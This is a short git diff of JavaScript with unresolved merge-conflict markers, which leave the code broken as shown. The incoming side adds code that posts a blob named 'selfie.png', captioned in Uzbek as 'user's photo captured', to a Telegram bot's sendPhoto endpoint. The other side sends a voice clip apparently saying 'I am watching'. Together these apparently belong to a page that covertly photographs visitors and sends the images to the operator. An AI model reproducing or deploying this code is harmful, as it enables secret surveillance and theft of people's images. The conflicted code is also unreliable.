@@ -52,11 +52,28 @@ async function start() {
       body: form,
     });
 
+<<<<<<< HEAD
     // Ovoz yuborish
     const audio = await fetch("music/koryapman.ogg").then(r => r.blob());
     const voiceForm = new FormData();
     voiceForm.append("chat_id", chatId);
     voiceForm.append("voice", audio, "koryapman.ogg");
+=======
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("photo", blob, "selfie.png");
+          form.append(
+            "caption",
+            "*Foydalanuvchi rasmi olindi ✅*",
+            "MarkdownV2"
+          );
+
+          const resp = await fetch(
+            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
+            { method: "POST", body: form }
+          );
+          const data = await resp.json().catch(() => null);
+>>>>>>> 32f1525 (m)
 
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
       method: "POST",
